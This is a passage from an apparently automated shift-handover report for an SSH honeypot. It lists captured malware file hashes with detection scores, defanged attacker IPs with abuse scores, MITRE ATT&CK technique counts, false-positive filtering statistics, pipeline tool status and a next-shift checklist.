| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.67.78[.]132` | ID | PT Fazza Multi Transportasi | **100** ⚠️ | 50 |
| `14.103.113[.]212` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `94.27.134[.]200` | HU | Magyar Telekom Plc. | **100** ⚠️ | 0 |
| `223.123.124[.]178` | PK | CMPak Limited | **100** ⚠️ | 7 |
| `8.154.0[.]104` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 50 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `47.108.129[.]145` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 7 |
| `184.168.30[.]159` | US | GoDaddy.com, LLC | **100** ⚠️ | 5 |
| `202.188.47[.]41` | MY | TM TECHNOLOGY SERVICES SDN. BHD. | **100** ⚠️ | 50 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (72 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 26 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 16 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 184 cases |
| Tool 34  | Credential Extractor        | ✅ 16 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 72 filtered (39.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 20 recon entry/entries in table (7 group(s) consolidating 89 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-14T06:49:27Z_
